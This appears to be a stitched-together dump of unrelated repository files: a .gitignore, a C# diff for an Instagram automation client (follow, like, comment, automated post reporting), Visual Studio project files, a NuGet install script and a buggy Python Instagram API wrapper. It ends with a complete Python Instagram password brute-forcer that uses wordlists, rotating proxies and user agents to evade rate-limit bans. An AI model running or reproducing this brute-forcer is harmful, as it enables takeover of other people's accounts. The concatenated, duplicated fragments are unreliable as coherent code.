# Compiled Object files
*.slo
*.lo
*.o
*.obj

# Precompiled Headers
*.gch
*.pch

# Compiled Dynamic libraries
*.so
*.dylib
*.dll

# Fortran module files
*.mod
*.smod

# Compiled Static libraries
*.lai
*.la
*.a
*.lib

# Executables
*.exe
*.out
*.app

{"status":"fail","message":"Your version of Instagram is out of date. Please upgrade your app in the Play Store to log in to Instagram."}

 {
                             // If we get result, it always return status ok. Otherwise, exception will occur.                                           
                             var responseData = streamReader.ReadToEnd();
-                            return JsonConvert.DeserializeObject<UpdateProfileResult>(responseData);                            
+                            return JsonConvert.DeserializeObject<UpdateProfileResult>(responseData);
                         }
                     }
                 }
@@ -246,15 +246,16 @@ public UpdateProfileResult SetUsername(string newUsername)
         /// <returns></returns>
         public FollowResult Follow(string username)
         {
+
+            Debug.WriteLine("Following " + username);
+            var publicInfo = GetPublicInfo(username);
+            var request = HttpRequestBuilder.Post($"https://www.instagram.com/web/friendships/{publicInfo.user.id}/follow/", mCoockieC);
+            request.Referer = $"https://www.instagram.com/{publicInfo.user.username}/";
+            request.Headers["X-CSRFToken"] = mCoockieC.GetCookies(new Uri("https://www.instagram.com"))["csrftoken"].Value;
+            request.Headers["X-Instagram-AJAX"] = "1";
+            request.Headers["X-Requested-With"] = "XMLHttpRequest";
             try
             {
-                Debug.WriteLine("Following " + username);
-                var publicInfo = GetPublicInfo(username);
-                var request = HttpRequestBuilder.Post($"https://www.instagram.com/web/friendships/{publicInfo.user.id}/follow/", mCoockieC);
-                request.Referer = $"https://www.instagram.com/{publicInfo.user.username}/";
-                request.Headers["X-CSRFToken"] = mCoockieC.GetCookies(new Uri("https://www.instagram.com"))["csrftoken"].Value;
-                request.Headers["X-Instagram-AJAX"] = "1";
-                request.Headers["X-Requested-With"] = "XMLHttpRequest";
                 using (var response = request.GetResponse() as HttpWebResponse)
                 {
                     mCoockieC.Add(response.Cookies);
@@ -296,23 +297,31 @@ public LikeResult Like(string postId)
             request.Headers["X-CSRFToken"] = mCoockieC.GetCookies(new Uri("https://www.instagram.com"))["csrftoken"].Value;
             request.Headers["X-Instagram-AJAX"] = "1";
             request.Headers["X-Requested-With"] = "XMLHttpRequest";
-            using (var response = request.GetResponse() as HttpWebResponse)
+            try
             {
-                mCoockieC.Add(response.Cookies);
-                if (request.HaveResponse)
+                using (var response = request.GetResponse() as HttpWebResponse)
                 {
-                    using (var responseStream = response.GetResponseStream())
-                    using (var streamReader = new StreamReader(responseStream))
+                    mCoockieC.Add(response.Cookies);
+                    if (request.HaveResponse)
                     {
-                        var responseData = streamReader.ReadToEnd();
-                        return JsonConvert.DeserializeObject<Models.LikeResult>(responseData);
+                        using (var responseStream = response.GetResponseStream())
+                        using (var streamReader = new StreamReader(responseStream))
+                        {
+                            var responseData = streamReader.ReadToEnd();
+                            return JsonConvert.DeserializeObject<Models.LikeResult>(responseData);
+                        }
+                    }
+                    else
+                    {
+                        throw new WebException("no response");
                     }
-                }
-                else
-                {
-                    throw new WebException("no response");
                 }
             }
+            catch (Exception ex)
+            {
+                Debug.WriteLine(ex.Message);
+                throw ex;
+            }
         }
 
         /// <summary>
@@ -332,26 +341,35 @@ public CommentResult Comment(string postId, string comment)
             request.Headers["X-CSRFToken"] = mCoockieC.GetCookies(new Uri("https://www.instagram.com"))["csrftoken"].Value;
             request.Headers["X-Instagram-AJAX"] = "1";
             request.Headers["X-Requested-With"] = "XMLHttpRequest";
-            using (var stream = request.GetRequestStream())
-            {
-                stream.Write(content, 0, content.Length);
-            }
-            using (var response = request.GetResponse() as HttpWebResponse)
+            try
             {
-                mCoockieC.Add(response.Cookies);
-                if (request.HaveResponse)
+                using (var stream = request.GetRequestStream())
                 {
-                    using (var responseStream = response.GetResponseStream())
-                    using (var streamReader = new StreamReader(responseStream))
-                    {
-                        var responseData = streamReader.ReadToEnd();
-                        return JsonConvert.DeserializeObject<Models.CommentResult>(responseData);
-                    }
+                    stream.Write(content, 0, content.Length);
                 }
-                else
+                using (var response = request.GetResponse() as HttpWebResponse)
                 {
-                    throw new WebException("no response");
+                    mCoockieC.Add(response.Cookies);
+                    if (request.HaveResponse)
+                    {
+                        using (var responseStream = response.GetResponseStream())
+                        using (var streamReader = new StreamReader(responseStream))
+                        {
+                            var responseData = streamReader.ReadToEnd();
+                            return JsonConvert.DeserializeObject<Models.CommentResult>(responseData);
+                        }
+                    }
+                    else
+                    {
+                        throw new WebException("no response");
+                    }
                 }
+
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine(ex.Message);
+                throw ex;
             }
         }
 
@@ -360,23 +378,46 @@ public CommentResult Comment(string postId, string comment)
         /// </summary>
         /// <param name="postId"></param>
         /// <returns></returns>
-        public bool Report(string postId)
+        public ReportResult Report(string postId, ReportReasonId reasonId)
         {
-            // I'm a good man, i don't test report XD
-            throw new NotImplementedException();
-        }
-
-        /// <summary>
-        /// Allow register new user account -- return Models.RegisterResult
-        /// </summary>
-        /// <param name="email"></param>
-        /// <param name="fullName"></param>
-        /// <param name="username"></param>
-        /// <param name="password"></param>
-        /// <returns></returns>
-        public bool Register(string email, string fullName, string username, string password)
-        {
-            throw new NotImplementedException();
+            var data = "reason_id=" + (int)reasonId;
+            var content = Encoding.ASCII.GetBytes(data);
+            var request = HttpRequestBuilder.Post($"https://www.instagram.com/media/{postId}/flag/", mCoockieC);
+            request.ContentType = "application/x-www-form-urlencoded";
+            request.Referer = $"https://www.instagram.com/";
+            request.ContentLength = content.Length;
+            request.Headers["X-CSRFToken"] = mCoockieC.GetCookies(new Uri("https://www.instagram.com"))["csrftoken"].Value;
+            request.Headers["X-Instagram-AJAX"] = "1";
+            request.Headers["X-Requested-With"] = "XMLHttpRequest";
+            try
+            {
+                using (var stream = request.GetRequestStream())
+                {
+                    stream.Write(content, 0, content.Length);
+                }
+                using (var response = request.GetResponse() as HttpWebResponse)
+                {
+                    mCoockieC.Add(response.Cookies);
+                    if (request.HaveResponse)
+                    {
+                        using (var responseStream = response.GetResponseStream())
+                        using (var streamReader = new StreamReader(responseStream))
+                        {
+                            var responseData = streamReader.ReadToEnd();
+                            return JsonConvert.DeserializeObject<ReportResult>(responseData);
+                        }
+                    }
+                    else
+                    {
+                        throw new WebException("no response");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine(ex.Message);
+                throw ex;
+            }
         }
 
         /// <summary>
3 InstagramUser/InstagramUser.csproj
@@ -48,13 +48,14 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="HttpRequestBuilder.cs" />
-    <Compile Include="Instaguser.cs" />
+    <Compile Include="InstagamUser.cs" />
     <Compile Include="Models\CommentResult.cs" />
     <Compile Include="Models\ProfileResult.cs" />
     <Compile Include="Models\FollowResult.cs" />
     <Compile Include="Models\LikeResult.cs" />
     <Compile Include="Models\LoginResult.cs" />
     <Compile Include="Models\PublicInfoResult.cs" />
+    <Compile Include="Models\ReportResult.cs" />
     <Compile Include="Models\UpdateProfileResult.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
18 InstagramUser/Models/ReportResult.cs
@@ -0,0 +1,18 @@
+namespace InstagramUser.Models
+{
+    public class ReportResult
+    {        
+        public string status { get; set; }
+    }
+
+    public enum ReportReasonId
+    {
+        SpamOrScram = 1,
+        SelfHarm = 2,
+        DrugUse = 3,
+        NudityOrPornography = 4,
+        GraphicViolence = 5,
+        HateSpeechOrSymbol = 6,
+        HarassmentOrBullying = 7
+    }
+}
17 InstagramUser/Program.cs
@@ -1,12 +1,12 @@
 using System;
-using System.Collections.Generic;
 
 namespace InstagramUser
 {
     class Program
     {
         static void Main(string[] args)
-        {            
+        {
+            ReportTest();
             Console.ReadLine();
         }
 
@@ -96,5 +96,18 @@ static void CommentTest()
 
             Console.ReadLine();
         }
+
+        static void ReportTest()
+        {
+            var user = new InstagamUser("username", "password");        
+            var loginResult = user.LogIn();
+            if (loginResult.authenticated)
+            {
+                var commentResult = user.Report("1289832948493489827", Models.ReportReasonId.NudityOrPornography);
+                Console.WriteLine(commentResult.status);
+            }
+
+            Console.ReadLine();
+        }
     }

<?xml version="1.0" encoding="utf-8"?>
<packages>
  <package id="Newtonsoft.Json" version="9.0.1" targetFramework="net452" />
</packages>
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 14
VisualStudioVersion = 14.0.25420.1
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "InstagramUser", "InstagramUser\InstagramUser.csproj", "{548FA529-87B4-41FE-B9F9-579DFD9A6A20}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{548FA529-87B4-41FE-B9F9-579DFD9A6A20}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{548FA529-87B4-41FE-B9F9-579DFD9A6A20}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{548FA529-87B4-41FE-B9F9-579DFD9A6A20}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{548FA529-87B4-41FE-B9F9-579DFD9A6A20}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 14
VisualStudioVersion = 14.0.25420.1
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "InstagramUser", "InstagramUser\InstagramUser.csproj", "{548FA529-87B4-41FE-B9F9-579DFD9A6A20}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{548FA529-87B4-41FE-B9F9-579DFD9A6A20}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{548FA529-87B4-41FE-B9F9-579DFD9A6A20}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{548FA529-87B4-41FE-B9F9-579DFD9A6A20}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{548FA529-87B4-41FE-B9F9-579DFD9A6A20}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal
param($installPath, $toolsPath, $package, $project)

# open json.net splash page on package install
# don't open if json.net is installed as a dependency

try
{
  $url = "http://www.newtonsoft.com/json/install?version=" + $package.Version
  $dte2 = Get-Interface $dte ([EnvDTE80.DTE2])

  if ($dte2.ActiveWindow.Caption -eq "Package Manager Console")
  {
    # user is installing from VS NuGet console
    # get reference to the window, the console host and the input history
    # show webpage if "install-package newtonsoft.json" was last input

    $consoleWindow = $(Get-VSComponentModel).GetService([NuGetConsole.IPowerConsoleWindow])

    $props = $consoleWindow.GetType().GetProperties([System.Reflection.BindingFlags]::Instance -bor `
      [System.Reflection.BindingFlags]::NonPublic)

    $prop = $props | ? { $_.Name -eq "ActiveHostInfo" } | select -first 1
    if ($prop -eq $null) { return }
  
    $hostInfo = $prop.GetValue($consoleWindow)
    if ($hostInfo -eq $null) { return }

    $history = $hostInfo.WpfConsole.InputHistory.History

    $lastCommand = $history | select -last 1

    if ($lastCommand)
    {
      $lastCommand = $lastCommand.Trim().ToLower()
      if ($lastCommand.StartsWith("install-package") -and $lastCommand.Contains("newtonsoft.json"))
      {
        $dte2.ItemOperations.Navigate($url) | Out-Null
      }
    }
  }
  else
  {
    # user is installing from VS NuGet dialog
    # get reference to the window, then smart output console provider
    # show webpage if messages in buffered console contains "installing...newtonsoft.json" in last operation

    $instanceField = [NuGet.Dialog.PackageManagerWindow].GetField("CurrentInstance", [System.Reflection.BindingFlags]::Static -bor `
      [System.Reflection.BindingFlags]::NonPublic)

    $consoleField = [NuGet.Dialog.PackageManagerWindow].GetField("_smartOutputConsoleProvider", [System.Reflection.BindingFlags]::Instance -bor `
      [System.Reflection.BindingFlags]::NonPublic)

    if ($instanceField -eq $null -or $consoleField -eq $null) { return }

    $instance = $instanceField.GetValue($null)

    if ($instance -eq $null) { return }

    $consoleProvider = $consoleField.GetValue($instance)
    if ($consoleProvider -eq $null) { return }

    $console = $consoleProvider.CreateOutputConsole($false)

    $messagesField = $console.GetType().GetField("_messages", [System.Reflection.BindingFlags]::Instance -bor `
      [System.Reflection.BindingFlags]::NonPublic)
    if ($messagesField -eq $null) { return }

    $messages = $messagesField.GetValue($console)
    if ($messages -eq $null) { return }

    $operations = $messages -split "=============================="

    $lastOperation = $operations | select -last 1

    if ($lastOperation)
    {
      $lastOperation = $lastOperation.ToLower()

      $lines = $lastOperation -split "`r`n"

      $installMatch = $lines | ? { $_.StartsWith("------- installing...newtonsoft.json ") } | select -first 1

      if ($installMatch)
      {
        $dte2.ItemOperations.Navigate($url) | Out-Null
      }
    }
  }
}
catch
{
  try
  {
    $pmPane = $dte2.ToolWindows.OutputWindow.OutputWindowPanes.Item("Package Manager")

    $selection = $pmPane.TextDocument.Selection
    $selection.StartOfDocument($false)
    $selection.EndOfDocument($true)

    if ($selection.Text.StartsWith("Attempting to gather dependencies information for package 'Newtonsoft.Json." + $package.Version + "'"))
    {
      # don't show on upgrade
      if (!$selection.Text.Contains("Removed package"))
      {
        $dte2.ItemOperations.Navigate($url) | Out-Null
      }
    }
  }
  catch
  {
    # stop potential errors from bubbling up
    # worst case the splash page won't open  
  }
}
requests==1.2.3
wsgiref==0.1.2
import functools

import requests


INSTAGRAM_API = 'https://api.instagram.com'


class BaseModel(object):

    @classmethod
    def parse_from_dict(cls, data):
        return cls(**data)


class Counts(BaseModel):

    def __init__(self, media, follows, followed_by):
        self.media = media
        self.follows = follows
        self.followed_by = followed_by


class User(BaseModel):

    def __init__(self, id, username, full_name, profile_picture,
                 bio, website, counts):
        if not isinstance(counts, Counts):
            raise TypeError('Counts must be an instance of Counts model')
        self.id = id
        self.username = username
        self.full_name = full_name
        self.profile_picture = profile_picture
        self.bio = bio
        self.website = website
        self.counts = counts


class Tag(BaseModel):

    def __init__(self, label):
        self.label = label


class Comment(BaseModel):

    def __init__(self, id, created_time, text, _from):
        self.id = id
        self.created_time = created_time
        self.text = text

        if not isinstance(_from, User):
            raise TypeError('From must be an instance of User model')
        self._from = _from


class Image(BaseModel):

    def __init__(self, type, url, width, height):
        self.type = type
        self.url = url
        self.width = width
        self.height = height


class Video(Image):
    pass


class Caption(BaseModel):

    def __init__(self, created_time, text, _from, id):
        self.created_time = created_time
        self.text = text
        self.id = id

        if not isinstance(_from, User):
            raise TypeError('From must be an instance of User model')
        self._from = _from


class Like(BaseModel):

    def __init__(self, username, profile_picture, id, full_name):
        self.username = username
        self.profile_picture = profile_picture
        self.id = id
        self.full_name = full_name


class Location(BaseModel):

    def __init__(self, id, latitude, longitude, name):
        self.id = id
        self.latitude = latitude
        self.longitude = longitude
        self.name = name


class Media(BaseModel):

    def __init__(self, attribution, tags, type, location, comments, filter,
                 created_time, link, likes, images, users_in_photo, caption,
                 user_has_liked, id, user, videos=None):
        self.attribution = attribution

        if not isinstance(tags, list):
            raise TypeError('Tags must be a list of Tag models')
        for tag in tags:
            if not isinstance(tag, Tag):
                raise TypeError('Tag must be an instance of Tag model')
        self.tags = tags
        self.type = type

        if not isinstance(comments, list):
            raise TypeError('Comments must be a list of Comment models')
        for comment in comments:
            if not isinstance(comment, Comment):
                raise TypeError('Comment must be an instance of Comment model')
        self.comments = comments
        self.filter = filter
        self.created_time = created_time
        self.link = link

        if not isinstance(likes, list):
            raise TypeError('Likes must be a list of Like models')
        for like in likes:
            if not isinstance(like, Like):
                raise TypeError('Like must be an instance of Like model')
        self.likes = likes

        if not isinstance(images, dict):
            raise TypeError('Images must be a dict of Image models')
        for image in images:
            if not isinstance(images.get(image), Image):
                raise TypeError('Image must be an instance of Image model')
        self.images = images

        if videos is not None:
            if not isinstance(videos, dict):
                raise TypeError('Videos must be a dict of Video models')
            for video in videos:
                if not isinstance(videos.get(video), Video):
                    raise TypeError('Video must be an instance of Video model')

        if not isinstance(users_in_photo, list):
            raise TypeError('Users in photo must be a list of User models')
        for user in users_in_photo:
            if not isinstance(user, User):
                raise TypeError('User must be an instance of User model')
        self.users_in_photo = users_in_photo

        if not isinstance(caption, Caption):
            raise TypeError('Caption must be an instance of Caption model')
        self.caption = caption

        self.user_has_liked = user_has_liked
        self.id = id

        if not isinstance(user, User):
            raise TypeError('User must be an instance of User model')
        self.user = user

        if location is not None:
            if not isinstance(location, Location):
                raise TypeError(
                    'Location must be an instance of Location model'
                )


def endpoint(uri, method='GET'):
    def _endpoint(ref):
        @functools.wraps(ref)
        def wrapper(**kwargs):
            req = requests.request(
                method,
                '%s%s' % (
                    INSTAGRAM_API,
                    uri % kwargs
                ),
                params=kwargs
            )
            if req.status_code != 200:
                raise requests.HTTPError(404)
            return ref(req)
        return wrapper
    return _endpoint


def _parse_medias(data):
    medias = []
    for media in data:
        tags = []
        for tag in media.get('tags'):
            tag = Tag.parse_from_dict(tag)
        comments = []
        for comment in media.get('comments'):
            comment = Comment.parse_from_dict(comment)
        likes = []
        for like in likes:
            like = Like.parse_from_dict(like)
        images = {}
        for image in media.get('images'):
            images.update({
                image: Image.parse_from_dict(
                    {'type': image}.update(media.get('images').get(image)))
            })
        videos = {}
        if media.get('videos', None) is not None:
            for video in media.get('videos'):
                videos.update({
                    video: Video.parse_from_dict(
                        {'type': video}.update(media.get('videos').get(video)))
                })
        if media.get('location', None) is not None:
            media.update({
                'location': Location.parse_from_dict(media.get('location'))
            })
        caption = Caption.parse_from_dict(media.get('caption'))
        user = User.parse_from_dict(media.get('user'))
        media.update({
            'tags': tags,
            'comments': comments,
            'likes': likes,
            'images': images,
            'caption': caption,
            'user': user
        })
        medias.append(Media.parse_from_dict(media))
    return medias


@endpoint('/v1/users/%(user_id)s')
def user_info(req):
    data = req.json().get('data')
    data.update({
        'counts': Counts.parse_from_dict(data.get('counts'))
    })
    user = User.parse_from_dict(data)
    return user


@endpoint('/v1/users/self/feed')
def user_self_feed(req):
    data = req.json().get('data')
    return _parse_medias(data)


@endpoint('/v1/users/%(user_id)s/media/recent')
def user_recent_media(req):
    data = req.json().get('data')
    return _parse_medias(data)


@endpoint('/v1/users/self/media/liked')
def user_self_liked(req):
    data = req.json().get('data')
    return _parse_medias(data)


@endpoint('/v1/users/search')
def users_search(req):
    data = req.json().get('data')
    users = []
    for user in data:
        users.append(User.parse_from_dict(data.get(user)))
return users

-def endpoint(uri, method='GET', api_prefix=INSTAGRAM_API):
+def endpoint(uri, method='GET', api_prefix=INSTAGRAM_API,
+             accept_client_id=False):
     def _endpoint(ref):
         @functools.wraps(ref)
         def wrapper(**kwargs):
-            uri = '%s%s' % (
+            if (
+                accept_client_id is True and
+                kwargs.get('client_id', None) is None
+            ) and kwargs.get('access_token', None) is None:
+                raise RuntimeError('%saccess_token required' % (
+                    'client_id or ' if accept_client_id is True else ''
+                ))
+
+            _uri = '%s%s' % (
                 api_prefix,
                 uri % kwargs
             )
-            uri = re.sub(r'\/+', '/', uri)
+            _uri = re.sub(r'\/+', '/', _uri)
             req = requests.request(
                 method,
-                uri,
+                _uri,
                 params=kwargs
             )
             if req.status_code != 200:
@@ -250,7 +259,7 @@ def user_self_feed(req):
     return _parse_medias(data)
 
 
-@endpoint('/users/%(user_id)s/media/recent')
+@endpoint('/users/%(user_id)s/media/recent', accept_client_id=True)
 def user_recent_media(req):
     data = req.json().get('data')
     return _parse_medias(data)
@@ -289,7 +298,7 @@ def media_popular(req):
     return _parse_medias(data)
 
 
-@endpoint('/geographies/%(geo_id)s/media/recent')
+@endpoint('/geographies/%(geo_id)s/media/recent', accept_client_id=True)
 def geo_media_recent(req):
     data = req.json().get('data')
     return _parse_medias(data)
# coding=utf-8
###############################################################################
# Instagram Brute forcer
# Developed By N3TC@T
# netcat[dot]av[at]gmail[dot]com 
# !/usr/bin/python
###############################################################################

import sys
import requests as rq
import random
import multiprocessing
import time


def check_avalaible_proxys(proxys):
    """
    check proxy lists for getting avalaible proxy's
    """
    # TODO: make proxy test function faster

    global proxys_working_list
    print "\n[-] Testing Proxy List..."
    proxys_working_list = {}
    for proxy in proxys:
        proxy = proxy.replace("\r", "").replace("\n", "")
        try:
            r = rq.get("https://api.ipify.org/", proxies={'https': 'https://' + proxy}, timeout=5)
            if r.status_code == 200:
                proxy_ip, sp, port = proxy.rpartition(':')
                if proxy_ip == r.text:
                    proxys_working_list.update({proxy: proxy})
                    print " --[+] ", proxy
        except rq.exceptions.RequestException:
            pass
    print "[+] Online Proxy: ", len(proxys_working_list)


def get_csrf():
    """
    get CSRF token from login page to use in POST requests
    """
    global csrf_token

    print "[+] Getting CSRF Token: "
    url = 'https://www.instagram.com/'
    r = rq.get(url)
    csrf_token = r.cookies['csrftoken']
    print "[+] CSRF Token :", csrf_token, "\n"


def brute(word, event):
    """
    main worker function
    :param word:
    :param event:
    :return:
    """
    global proxy_string
    try:
        proxy = None
        if len(proxys_working_list) != 0:
            proxy = random.choice(proxys_working_list)
            proxy_string = {'https': 'https://' + proxy + '/'}

        word = word.replace("\r", "").replace("\n", "")
        post_data = {
            'username': USER,
            'password': word,
        }
        header = {
            "User-Agent": random.choice(user_agents),
            'X-Instagram-AJAX': 1,
            "X-CSRFToken": csrf_token,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        cookies = {
            "csrftoken": csrf_token
        }

        if proxy:
            print "[*] Trying %s %s " % (word, " | " + proxy,)
        else:
            print "[*] Trying %s" % (word,)

        if proxy:
            r = rq.post(URL, headers=header, data=post_data, cookies=cookies, proxies=proxy_string, timeout=10)
        else:
            r = rq.post(URL, headers=header, data=post_data, cookies=cookies, timeout=10)

        if r.status_code != 200:
            if r.status_code == 400:
                if proxy:
                    print "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
                    proxys_working_list.pop(proxy)
                else:
                    print "[!]Error : Your Ip is now on Instagram jail , script will not work fine until you change your ip or use proxy"
            else:
                print "Error:", r.status_code
        else:
            if r.text.find('{"status":"ok","authenticated":true}') != -1:
                print "\n[*]Successful Login:"
                print "---------------------------------------------------"
                print "[!]Username: ", USER
                print "[!]Password: ", word
                print "---------------------------------------------------\n"
                print "[-] Brute Complete\n"
                event.set()
                sys.exit()

    except rq.exceptions.Timeout:
        print "[!] Time Out ..."
        pass
        return


def starter():
    """
    multiprocessing workers initialize
    """
    print "\n[!] Initializing Workers"
    print "[!] Start Cracking ... \n"
    p = multiprocessing.Pool(THREAD)
    m = multiprocessing.Manager()
    event = m.Event()

    for word in words:
        p.apply_async(brute, (word, event))

    event.wait()
    sys.exit()


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print "\nUsage : ./instabrute.py <username> <wordlist> <proxylist> <thread>"
        print "Eg: ./instabrute.py netcat words.txt proxy.txt 4\n"
        sys.exit(1)

    URL = "https://www.instagram.com/accounts/login/ajax/"
    USER = sys.argv[1]
    PROXY = sys.argv[3]
    THREAD = int(sys.argv[4])

    user_agents = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
                   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
                   'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
                   'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
                   'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
                   'Microsoft Internet Explorer/4.0b1 (Windows 95)',
                   'Opera/8.00 (Windows NT 5.1; U; en)',
                   'amaya/9.51 libwww/5.4.0',
                   'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
                   'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
                   'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
                   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
                   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
                   'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]'
                   ]

    try:
        words = open(sys.argv[2]).readlines()
    except IOError:
        print "[-] Error: Check your word list file path\n"
        sys.exit(1)

    try:
        proxys = open(sys.argv[3]).readlines()
    except IOError:
        print "[-] Error: Check your proxy list file path\n"
        sys.exit(1)

    print "\n***************************************"
    print "* Inastgarm Brute forcer              *"
    print "* Coded by N3TC@T                     *"
    print "* netcat[dot]av[at]gmail[dot]com      *"
    print "***************************************"
    print "[+] Username Loaded:", USER
    print "[+] Words Loaded:", len(words)
    print "[+] Proxy Loaded:", len(proxys)

    check_avalaible_proxys(proxys)
    get_csrf()
starter()
